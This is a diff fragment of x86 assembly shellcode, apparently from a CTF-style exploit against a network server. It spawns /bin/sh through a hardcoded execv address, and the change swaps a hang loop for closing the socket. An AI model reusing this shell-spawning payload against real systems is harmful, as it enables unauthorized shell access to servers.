@@ -99,14 +99,8 @@ mov     ecx, esp #put pointer to string in ecx
 #execute bin_sh
 mov     eax, 0x080486D0
 call    eax #<execv@plt>
-
-#dont continue with the server
-loop: 
-jmp loop
-
+#close socket
 add    esp,0x10
 sub    esp,0xc
 push   DWORD PTR [ebp-0x28]
 call   0x08048770 #<close@plt>
-
-
